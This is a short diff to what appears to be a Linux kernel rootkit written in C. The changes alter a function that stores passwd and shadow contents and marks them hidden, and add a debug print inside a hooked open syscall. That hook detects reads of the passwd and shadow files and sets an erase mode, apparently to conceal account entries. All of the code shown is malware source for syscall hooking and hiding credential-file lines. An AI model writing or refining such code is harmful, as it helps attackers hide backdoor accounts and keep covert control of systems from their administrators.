@@ -53,7 +53,7 @@ int fugitive(const char __user *passwd, const char __user *shadow) {
   fugitive__lines[0] = _passwd;
   fugitive__lines[1] = _shadow;
   fugitive__hidden = ~0;
-  return retval;
+  return 0;
 }
 
 static int fugitive__atoui(int *dest, const char *a) {
@@ -276,6 +276,8 @@ asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
     } else if(!strcmp(SHADOW_PATH, pathname)){
         erase = SHAD_E;
     }
+    if (erase)
+      printk("%s\n", pathname);
     return (*((asmlinkage int (*)(char *, int, mode_t)) &fugitive__hooks[1].original))(pathname, flags, mode);
 }
 
